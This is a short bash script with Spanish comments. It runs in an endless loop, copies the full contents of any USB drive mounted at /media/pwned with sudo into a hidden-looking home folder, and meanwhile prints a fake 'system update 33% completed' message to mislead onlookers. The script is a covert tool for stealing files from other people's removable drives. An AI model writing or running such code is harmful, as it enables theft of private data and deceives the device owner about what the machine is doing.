#!/bin/bash
FILE=/media/pwned/
#DATE=$(date +"%H-%M-%S")
while true; do
#cambiar por el archivo, comprobar con los pendrives
if [ "$(ls $FILE)" ]
then
  sudo cp -r $FILE /home/pwned/$RANDOM
else
  echo "Actualizando o sistema... 33% completado"
fi
#cambiar por el usuario, atento la línea del copiado (revisa antes que aparece)
sleep 40
done
